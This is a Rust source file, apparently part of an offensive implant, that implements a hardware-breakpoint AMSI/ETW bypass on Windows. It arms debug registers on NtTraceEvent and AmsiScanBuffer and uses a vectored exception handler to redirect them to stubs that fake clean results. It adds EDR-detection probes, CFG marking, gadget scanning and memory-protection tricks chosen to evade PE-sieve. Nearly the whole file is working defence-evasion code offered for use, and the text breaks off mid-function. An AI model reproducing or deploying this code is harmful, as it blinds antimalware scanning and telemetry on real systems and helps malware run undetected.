//! Hardware-breakpoint (HWBP) patchless blind — SOTA AMSI/ETW bypass.
//!
//! Sets DR0 execute breakpoint on target function's first instruction.
//! On STATUS_SINGLE_STEP, VEH handler redirects RIP to a shadow stub
//! that returns a clean value. Target function never executes.
//!
//! ## Why stealthier
//! - No `VirtualProtect` on a code page
//! - No in-memory byte modification (PE-sieve `.text` hash stays clean)
//! - Only debug register write + VEH registration
//!
//! ## VEH pattern (RF-based, single-phase)
//! 1. CPU hits DR0 → STATUS_SINGLE_STEP → VEH fires
//! 2. VEH sets RIP = shadow stub, sets Resume Flag (EFLAGS bit 16)
//! 3. RF tells CPU to skip the HWBP for ONE instruction → shadow executes
//! 4. Shadow stub sets RAX (clean return value) and ret → returns to caller
//! 5. Next call to the target fires the HWBP again (RF was one-shot)

#![cfg(target_os = "windows")]

// ---- Shadow type ---------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShadowType {
    EtwEaxZero,     // xor eax,eax; ret
    AmsiInvalidArg, // mov eax,0x80070057; ret
}

// ---- CONSTANTS -----------------------------------------------------------

/// STATUS_SINGLE_STEP — hardware breakpoint / single-step exception.
/// Windows NTSTATUS 0x80000004 as signed i32.
const STATUS_SINGLE_STEP: i32 = -0x7FFF_FFFC; // 0x80000004

/// Return this from VEH to discard context changes and keep searching.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Return this from VEH to apply modified ContextRecord and resume.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10 = 0x100010.
const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

/// CONTEXT_CONTROL = RIP, EFlags, segment regs, etc. (0x100001 for AMD64).
const CONTEXT_CONTROL: u32 = 0x0010_0001;

/// CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |
///                 CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS = 0x10001F
const CONTEXT_FULL_AMD64: u32 = 0x0010_001F;

const NT_CURRENT_THREAD: usize = 0xFFFF_FFFF_FFFF_FFFE;

/// EFLAGS Resume Flag — bit 16. When set, the CPU skips the next HWBP trigger
/// for exactly one instruction.
const RF_BIT: u32 = 1 << 16;

// ---- x64 CONTEXT offsets (verified against WinNT.h _CONTEXT AMD64) ------
//
//  0x030 ContextFlags   0x038 SegCs   0x044 EFlags
//  0x048 Dr0            0x050 Dr1     0x058 Dr2     0x060 Dr3
//  0x068 Dr6            0x070 Dr7
//  0x078 Rax            0x080 Rcx     0x088 Rdx     0x090 Rbx
//  0x098 Rsp            0x0A0 Rbp     0x0A8 Rsi     0x0B0 Rdi
//  0x0B8 R8  .. 0x0E8 R15   0x0F8 Rip
//  0x100 .. 0x2FF FltSave (XMM_SAVE_AREA32, 512B)
//  0x300 .. 0x49F VectorRegister[26]   0x4A0 VectorControl
//  0x4A8 .. 0x4D7 DebugControl, LastBranchTo/FromRip, LastExceptionTo/FromRip
//  TOTAL 1232 (0x4D0)

const CTX_CONTEXT_FLAGS: usize = 0x030;
const CTX_EFLAGS: usize = 0x044;
const CTX_DR0: usize = 0x048;
const CTX_DR6: usize = 0x068;
const CTX_DR7: usize = 0x070;
const CTX_RAX: usize = 0x078;
const CTX_RIP: usize = 0x0F8;

// ---- STATE ---------------------------------------------------------------

#[derive(Debug, Clone, Copy)]
struct HwbpEntry {
    target: usize,
    shadow: usize,
    original_dr7: u64,
}

static mut HWBP_ENTRIES: [Option<HwbpEntry>; 4] = [None, None, None, None];
static mut HWBP_COUNT: usize = 0;
static mut VEH_HANDLE: *mut core::ffi::c_void = core::ptr::null_mut();
static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();

/// true = VEH chain appears clean / safe to register our HWBP handler.
/// Set false by veh_chain_has_handlers() if probe detects pre-existing
/// handlers or EDR interference. Implant SHOULD check this before relying
/// on HWBP-based blind patches.
pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(true);

/// Initialize CFG bypass subsystem. Called during bootstrap.
/// Scans for proxy gadgets and return-address stubs in system DLLs.
/// The gadgets are available for future sync-exception proxy flows
/// (Micro-Stager). For async HWBP exceptions, CFG marking + direct
/// VEH registration is the current path.
///
/// # Safety
/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
pub unsafe fn init_countermeasures() {
    // Scan for proxy gadgets (jmp rbx / call rbx in ntdll/kernelbase).
    if !crate::proxy_veh::proxy_available() {
        crate::proxy_veh::init_proxy_gadgets();
    }
    if crate::proxy_veh::proxy_available() {
        diag(b'G'); // gadget found
    }

    // Scan for return-address stub (ADD RSP,X; RET or bare RET in ntdll).
    if let Some(stub) = crate::caller_spoof::scan_return_stub() {
        diag(b'R'); // stub found
        // Store for future use by caller-spoof thunk.
        let _ = stub;
    }
}

/// Runtime switch for diag() file writes. Defaults OFF in production.
/// Set to true via `set_diag_enabled(true)` during selftest only.
pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(false);

/// Enable/disable diag() file writes at runtime.
pub fn set_diag_enabled(on: bool) {
    DIAG_ENABLED.store(on, core::sync::atomic::Ordering::Release);
}

/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
/// Used for step-by-step crash diagnostics during selftest ONLY.
/// **Gated behind DIAG_ENABLED** — production builds never write to disk.
pub(crate) unsafe fn diag(ch: u8) {
    if !DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
        return;
    }
    let mut path = [0u16; 22];
    let name = b"C:\\nyx\\hwbp_diag.txt";
    let mut i = 0;
    while i < name.len() {
        path[i] = name[i] as u16;
        i += 1;
    }
    path[name.len()] = 0;

    type FnCreate = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut core::ffi::c_void,
        u32,
        u32,
        *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    type FnWrite = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *const u8,
        u32,
        *mut u32,
        *mut core::ffi::c_void,
    ) -> i32;
    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;

    let Some(cf) = crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))
    else {
        return;
    };
    let Some(wf) = crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"WriteFile"))
    else {
        return;
    };
    let Some(ch_) = crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))
    else {
        return;
    };
    let create_file: FnCreate = core::mem::transmute(cf);
    let write_file: FnWrite = core::mem::transmute(wf);
    let close_handle: FnClose = core::mem::transmute(ch_);

    let h = create_file(
        path.as_ptr(),
        4,
        3,
        core::ptr::null_mut(),
        4,
        0x80,
        core::ptr::null_mut(),
    );
    if h as isize == -1 {
        return;
    }
    if let Some(sfp) = crate::resolve::export_addr(b"kernelbase.dll", b"SetFilePointer")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer"))
    {
        let set_fp: FnSetFP = core::mem::transmute(sfp);
        set_fp(h, 0, core::ptr::null_mut(), 2);
    }
    let byte = [ch];
    let mut nwritten: u32 = 0;
    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
    close_handle(h);
}

// ---- INIT ----------------------------------------------------------------

pub unsafe fn init_shadow_buffer() -> bool {
    if !SHADOW_BUF.is_null() {
        return true;
    }
    let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => return false,
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let f: VAlloc = core::mem::transmute(addr);
    // MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
    // Allocate as RW first, write shadow stubs, then downgrade to RX.
    let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x04);
    if page.is_null() {
        return false;
    }
    SHADOW_BUF = page as *mut u8;
    let buf = core::slice::from_raw_parts_mut(SHADOW_BUF, 64);
    // Shadow stub 0: xor eax,eax; ret  (ETW → return 0 = success)
    buf[0] = 0x31;
    buf[1] = 0xC0;
    buf[2] = 0xC3;
    // Shadow stub 1: mov eax,0x80070057; ret  (AMSI → return E_INVALIDARG)
    buf[8] = 0xB8;
    buf[9] = 0x57;
    buf[10] = 0x00;
    buf[11] = 0x07;
    buf[12] = 0x80;
    buf[13] = 0xC3;

    // Downgrade page protection: PAGE_READWRITE → PAGE_EXECUTE_READ (0x20).
    // Shadow stubs are written once and never modified; RX is sufficient and
    // closes the RWX IOC that EDR/PE-sieve would flag.
    type FnVP = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
    let vp_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
    if let Some(vp) = vp_addr {
        let vp_fn: FnVP = core::mem::transmute(vp);
        let mut old_protect: u32 = 0;
        // PAGE_EXECUTE_READ = 0x20
        let _ = vp_fn(page, 0x1000, 0x20, &mut old_protect);
    }
    true
}

unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
    if SHADOW_BUF.is_null() {
        return None;
    }
    match st {
        ShadowType::EtwEaxZero => Some(SHADOW_BUF as usize),
        ShadowType::AmsiInvalidArg => Some(SHADOW_BUF as usize + 8),
    }
}

// ---- VEH HANDLER ---------------------------------------------------------

/// Vectored Exception Handler for HWBP interception.
///
/// Pattern (RF-based, single-phase):
/// - CPU hits DR0 execute breakpoint → #DB → EXCEPTION_SINGLE_STEP
/// - VEH fires: check DR6.B0–B3 to confirm which slot triggered
/// - If match: set RIP = shadow stub, set RF (bit 16) to skip breakpoint
///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
/// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
/// - Next call to the target fires the HWBP again (RF was one-shot)
static mut VEH_DIAG_BUF: [u8; 128] = [0u8; 128];

/// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
/// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
unsafe fn vehtag(ch: u8) {
    use core::sync::atomic::AtomicUsize;
    static POS: AtomicUsize = AtomicUsize::new(0);
    let pos = POS.load(core::sync::atomic::Ordering::Relaxed);
    if pos < 126 {
        let hex = b"0123456789abcdef";
        VEH_DIAG_BUF[pos] = hex[((ch >> 4) & 0xf) as usize];
        VEH_DIAG_BUF[pos + 1] = hex[(ch & 0xf) as usize];
        POS.store(pos + 2, core::sync::atomic::Ordering::Relaxed);
    }
}

/// Read VEH_DIAG_BUF contents (for post-mortem inspection).
pub unsafe fn read_veh_diag() -> [u8; 128] {
    VEH_DIAG_BUF
}

#[no_mangle]
pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'V');
    } // VEH entered

    if ep == 0 {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'0');
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // EXCEPTION_POINTERS: [+0] = PEXCEPTION_RECORD, [+8] = PCONTEXT
    let ep_ptr = ep as *const u8;
    let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
    let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
    if exr.is_null() || ctx.is_null() {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'N');
        } // null pointers
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ExceptionRecord.ExceptionCode at offset +0x00 (i32)
    let code = core::ptr::read_unaligned(exr as *const i32);
    if code != STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'S');
    } // STATUS_SINGLE_STEP confirmed

    // Read DR6 — bits 0–3 indicate which slot triggered.
    // DR6 is in the CONTEXT at offset 0x068 (u64).
    let dr6 = core::ptr::read_unaligned(ctx.add(CTX_DR6) as *const u64);

    // DR6 bit 14 (BS) = single-step. For HWBP, at least one of B0–B3 (bits 0–3)
    // should also be set. If BS is set but no B bits, it's a single-step trap
    // (e.g. from TF flag), not our HWBP.
    let slot_bits = dr6 & 0xF;
    if slot_bits == 0 {
        // No B0–B3 set → not a hardware breakpoint trigger, pass through.
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'b');
        } // no B bits
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'b' + slot_bits as u8);
    } // which slot(s)

    // ContextRecord.Rip at x64 CONTEXT offset 0x0F8
    let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;

    // Check DR6 bits against our registered breakpoints.
    for i in 0..4u8 {
        if (slot_bits & (1 << i)) == 0 {
            continue;
        }
        let entry = core::ptr::read_volatile(&HWBP_ENTRIES[i as usize] as *const Option<HwbpEntry>);
        if let Some(ref e) = entry {
            // Verify: RIP or ExceptionAddress should match our target
            let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize);
            if fault_addr == e.target || rip == e.target {
                // ====== HIT: redirect to shadow stub ======
                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
                    vehtag(b'R');
                } // redirecting

                // Clear DR6 — Windows doesn't auto-clear it, and stale bits
                // cause misidentification on the next exception.
                core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);

                // Set RIP to shadow stub (xor eax,eax;ret or mov eax,...;ret)
                core::ptr::write_unaligned(ctx.add(CTX_RIP) as *mut u64, e.shadow as u64);

                // Set Resume Flag (EFLAGS bit 16) — tells CPU to skip the
                // HWBP trigger for exactly ONE instruction (the shadow stub).
                let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
                core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);

                // We need CONTEXT_CONTROL (at minimum) to apply EFlags+Rip,
                // and CONTEXT_DEBUG_REGISTERS to apply DR6 clear. Set the
                // context flags to ensure the OS applies all our changes.
                let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
                core::ptr::write_unaligned(
                    ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
                    flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
                );

                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
                    vehtag(b'X');
                } // done
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'M');
    } // no match
    EXCEPTION_CONTINUE_SEARCH
}


// ---- VEH CHAIN PROBE ------------------------------------------------------

/// Dummy VEH handler — always continues search.
/// Used by `veh_chain_has_handlers` as a transient probe.
unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
    EXCEPTION_CONTINUE_SEARCH // 0 — keep walking the chain
}

/// Probe whether the VEH chain has pre-existing handlers or EDR interference.
///
/// Strategy:
/// 1. Register a transient dummy handler via `AddVectoredExceptionHandler(1,…)`.
/// 2. Immediately remove it via `RemoveVectoredExceptionHandler`.
/// 3. If either call fails (null handle or zero return), the chain is likely
///    compromised — an EDR may be hooking the VEH API or already occupying it.
///
/// Returns `true` if the chain appears compromised (unsafe to register).
/// Returns `false` if the probe was clean (safe to register).
///
/// On failure, also sets `VEH_SAFE` to `false`.
pub(crate) fn veh_chain_has_handlers() -> bool {
    unsafe {
        // Resolve AddVectoredExceptionHandler
        let add_addr = match crate::resolve::export_addr(
            b"kernelbase.dll",
            b"AddVectoredExceptionHandler",
        )
        .or_else(|| {
            crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
        }) {
            Some(a) => a,
            None => {
                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
                return true;
            }
        };
        type AddVEH = unsafe extern "system" fn(
            usize,
            unsafe extern "system" fn(usize) -> i32,
        ) -> *mut core::ffi::c_void;
        let add: AddVEH = core::mem::transmute(add_addr);

        // Resolve RemoveVectoredExceptionHandler
        let rm_addr = match crate::resolve::export_addr(
            b"kernelbase.dll",
            b"RemoveVectoredExceptionHandler",
        )
        .or_else(|| {
            crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
        }) {
            Some(a) => a,
            None => {
                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
                return true;
            }
        };
        type RemoveVEH =
            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
        let rm: RemoveVEH = core::mem::transmute(rm_addr);

        // Register probe at the front of the chain (First = 1).
        let handle = add(1, probe_veh_handler);
        if handle.is_null() {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return true;
        }

        // Remove the probe immediately.
        if rm(handle) == 0 {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return true;
        }

        false // chain appears clean
    }
}
// ---- ADD / REMOVE --------------------------------------------------------

/// Write a u64 to the Context buffer at the given offset (via raw pointer).
unsafe fn ctx_write_u64_at(base: usize, off: usize, val: u64) {
    core::ptr::write_unaligned((base + off) as *mut u64, val);
}

/// Write a u32 to the Context buffer at the given offset.
unsafe fn ctx_write_u32_at(base: usize, off: usize, val: u32) {
    core::ptr::write_unaligned((base + off) as *mut u32, val);
}

/// Read a u64 from the Context buffer at the given offset.
unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
    core::ptr::read_unaligned((base + off) as *const u64)
}

/// Set a hardware breakpoint on `target_addr` using the given shadow type.
///
/// Uses `NtGetContextThread` / `NtSetContextThread(NT_CURRENT_THREAD, ctx)`
/// with `CONTEXT_DEBUG_REGISTERS` for the set call.
///
/// Returns the DR slot index (0–3) on success.
pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<usize, &'static str> {
    diag(b'a'); // enter add_hwbp
    if SHADOW_BUF.is_null() {
        diag(b'1'); // shadow not init
        return Err("shadow buffer not initialized");
    }
    let shadow = match shadow_addr(shadow_type) {
        Some(s) => s,
        None => {
            diag(b'2');
            return Err("invalid shadow type");
        }
    };
    diag(b'b'); // shadow addr OK
    let slot = match HWBP_ENTRIES.iter().position(|e| e.is_none()) {
        Some(s) => s,
        None => {
            diag(b'3');
            return Err("all 4 DR slots full");
        }
    };
    diag(b'c'); // slot found

    // Resolve NtGetContextThread and NtSetContextThread first (before any state changes).
    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
    let ntgct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
        Some(a) => a,
        None => {
            diag(b'H');
            return Err("NtGetContextThread unresolved");
        }
    };
    let ntgct: FnCtx = core::mem::transmute(ntgct_addr);
    let ntsct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
        Some(a) => a,
        None => {
            diag(b'J');
            return Err("NtSetContextThread unresolved");
        }
    };
    let ntsct: FnCtx = core::mem::transmute(ntsct_addr);


    // Probe VEH chain before first registration. If an EDR already has handlers
    // in the chain, our HWBP-based blind approach is compromised — bail out
    // and set VEH_SAFE=false so the implant can fall back to byte-patch mode.
    // Cache: once VEH_SAFE is false, skip re-probing.
    if VEH_HANDLE.is_null() && !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
        diag(b'v'); // VEH chain previously flagged unsafe
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    if VEH_HANDLE.is_null() && veh_chain_has_handlers() {
        diag(b'V'); // VEH chain compromised (fresh probe)
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    // Register VEH if not done (MUST be before setting breakpoints).
    if VEH_HANDLE.is_null() {
        diag(b'd'); // registering VEH

        // ---- CFG bypass: mark handler as valid indirect-call target ----
        if crate::cfg_user::cfg_enabled() {
            crate::cfg_user::mark_addr_cfg_valid(hwbp_veh_handler as usize);
            if !SHADOW_BUF.is_null() {
                crate::cfg_user::mark_addr_cfg_valid(SHADOW_BUF as usize);
            }
        }

        let addr =
            match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler") {
                Some(a) => a,
                None => match crate::resolve::export_addr(
                    b"kernel32.dll",
                    b"AddVectoredExceptionHandler",
                ) {
                    Some(a) => a,
                    None => {
                        diag(b'D');
                        return Err("AVEH unresolved");
                    }
                },
            };
        diag(b'x'); // addr resolved
        type AddVEH = unsafe extern "system" fn(
            usize,
            unsafe extern "system" fn(usize) -> i32,
        ) -> *mut core::ffi::c_void;
        let f: AddVEH = core::mem::transmute(addr);
        diag(b'y'); // about to call AVEH
        VEH_HANDLE = f(1, hwbp_veh_handler);
        diag(b'z'); // AVEH returned
        if VEH_HANDLE.is_null() {
            diag(b'E'); // AVEH returned null
            return Err("AddVectoredExceptionHandler failed");
        }
    }
    diag(b'e'); // VEH registered

    // Allocate a CONTEXT buffer via VirtualAlloc (page-aligned = 16-byte aligned).
    let va_addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => {
            diag(b'F');
            return Err("VirtualAlloc unresolved");
        }
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        diag(b'G'); // VA failed
        return Err("VirtualAlloc for CONTEXT failed");
    }
    let base = ctx_buf as usize;
    diag(b'f'); // ctx allocated

    // Zero out the context buffer completely.
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);

    // Use CONTEXT_FULL_AMD64 (0x10001F) for GetContext to get ALL register state
    // including DR0-DR7, EFlags, RIP, etc. Using only CONTEXT_DEBUG_REGISTERS
    // for GetContext is insufficient — the OS may not populate all debug regs.
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_FULL_AMD64);
    diag(b'g'); // ctx flags set to CONTEXT_FULL

    // NtGetContextThread(NT_CURRENT_THREAD, ctx) — get current thread context.
    let st = ntgct(NT_CURRENT_THREAD, base);
    if st < 0 {
        free_ctx_buf(ctx_buf);
        diag(b'I'); // GetContext failed
        return Err("NtGetContextThread failed");
    }
    diag(b'h'); // GetContext OK

    // Save original DR7 for later restoration by remove_hwbp.
    let original_dr7 = ctx_read_u64_at(base, CTX_DR7);
    vehtag(b'O'); // original DR7 saved

    // Configure DRx with the target address (slot-specific register).
    // DR0 is at offset 0x048, DR1 at 0x050, DR2 at 0x058, DR3 at 0x060.
    ctx_write_u64_at(base, CTX_DR0 + slot * 8, target_addr as u64);

    // Clear DR6 (debug status) — stale bits cause misidentification.
    ctx_write_u64_at(base, CTX_DR6, 0);

    // Configure DR7 for an EXECUTE breakpoint on the assigned slot:
    //
    // DR7 bit layout:
    //   Bits 0,2,4,6: L0,L1,L2,L3 — Local enable for DR0–DR3
    //   Bits 1,3,5,7: G0,G1,G2,G3 — Global enable for DR0–DR3
    //   Bits 16-17: R/W0  Bits 18-19: LEN0
    //   Bits 20-21: R/W1  Bits 22-23: LEN1
    //   Bits 24-25: R/W2  Bits 26-27: LEN2
    //   Bits 28-29: R/W3  Bits 30-31: LEN3
    //
    // For an execute breakpoint: R/W = 00 (execute), LEN = 00 (1 byte).
    // Start from the original DR7, clear only this slot's bits, then set L.
    let mut new_dr7 = original_dr7;
    // Clear L and G bits for this slot (bits at position slot*2 and slot*2+1)
    new_dr7 &= !(0x3u64 << (slot * 2));
    // Clear R/W and LEN bits for this slot (4 bits starting at 16 + slot*4)
    new_dr7 &= !(0xFu64 << (16 + slot * 4));
    // Set L bit (local enable) for this slot — R/W and LEN default to 0 (execute, 1-byte)
    new_dr7 |= 1u64 << (slot * 2);

    ctx_write_u64_at(base, CTX_DR7, new_dr7);
    diag(b'i'); // DRs set

    // Set ContextFlags to CONTEXT_DEBUG_REGISTERS for the Set call —
    // we only want to write debug registers, not corrupt other state.
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);

    // NtSetContextThread(NT_CURRENT_THREAD, ctx) — apply the debug registers.
    let st2 = ntsct(NT_CURRENT_THREAD, base);
    free_ctx_buf(ctx_buf);
    if st2 < 0 {
        diag(b'K'); // SetContext failed
        return Err("NtSetContextThread failed");
    }
    diag(b'j'); // SetContext OK — HWBP armed

    HWBP_ENTRIES[slot] = Some(HwbpEntry {
        target: target_addr,
        shadow,
        original_dr7,
    });
    HWBP_COUNT += 1;
    diag(b'k'); // registered
    Ok(slot)
}

/// Remove a hardware breakpoint and restore the original DR7.
pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
    if slot >= 4 || HWBP_ENTRIES[slot].is_none() {
        return Err("invalid slot");
    }
    let entry = HWBP_ENTRIES[slot].take();
    HWBP_COUNT -= 1;

    // Allocate CONTEXT buffer.
    let va_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
        .ok_or("VirtualAlloc unresolved")?;
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        return Err("VirtualAlloc for CONTEXT failed");
    }
    let base = ctx_buf as usize;
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);

    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);

    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
    let ntgct: FnCtx = core::mem::transmute(
        crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")
            .ok_or("NtGetContextThread unresolved")?,
    );
    if ntgct(NT_CURRENT_THREAD, base) >= 0 {
        // Clear the slot-specific DRx register and DR6.
        ctx_write_u64_at(base, CTX_DR0 + slot * 8, 0);
        ctx_write_u64_at(base, CTX_DR6, 0);

        // Clear only this slot's bits in DR7 — restoring the full original_dr7
        // is unsafe when other slots are active (it would clobber their L/RW/LEN bits).
        let cur_dr7 = ctx_read_u64_at(base, CTX_DR7);
        let mut dr7 = cur_dr7;
        // Clear L and G for this slot
        dr7 &= !(0x3u64 << (slot * 2));
        // Clear R/W and LEN for this slot
        dr7 &= !(0xFu64 << (16 + slot * 4));
        ctx_write_u64_at(base, CTX_DR7, dr7);
        ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
        let ntsct: FnCtx = core::mem::transmute(
            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")
                .ok_or("NtSetContextThread unresolved")?,
        );
        let _ = ntsct(NT_CURRENT_THREAD, base);
    }

    free_ctx_buf(ctx_buf);

    // Remove VEH when no more breakpoints are active.
    if HWBP_COUNT == 0 && !VEH_HANDLE.is_null() {
        if let Some(a) =
            crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
                .or_else(|| {
                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
                })
        {
            type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
            let f: RemoveVEH = core::mem::transmute(a);
            f(VEH_HANDLE);
            VEH_HANDLE = core::ptr::null_mut();
        }
    }
    Ok(())
}

/// Free a VirtualAlloc'd context buffer.
unsafe fn free_ctx_buf(buf: *mut core::ffi::c_void) {
    if let Some(vf_addr) = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualFree")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree"))
    {
        type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
        let vff: VFree = core::mem::transmute(vf_addr);
        vff(buf, 0, 0x8000); // MEM_RELEASE
    }
}

pub fn active_count() -> usize {
    unsafe { HWBP_COUNT }
}

pub fn is_ready() -> bool {
    unsafe { !SHADOW_BUF.is_null() }
}

/// Returns true if the VEH chain was found clean during probe.
/// Implant SHOULD check this before relying on HWBP-based patches;
/// if false, fall back to byte-patch mode.
pub fn is_veh_safe() -> bool {
    VEH_SAFE.load(core::sync::atomic::Ordering::Acquire)
}

/// Set HWBP on `ntdll!NtTraceEvent` → shadow returns 0 (ETW suppressed).
pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
        .ok_or("NtTraceEvent unresolved")?;
    add_hwbp(addr, ShadowType::EtwEaxZero)
}

/// Set HWBP on `amsi!AmsiScanBuffer` → shadow returns E_INVALIDARG (AMSI suppressed).
pub unsafe fn blind_amsi_hwbp() -> Result<usize, &'static str> {
    let addr =
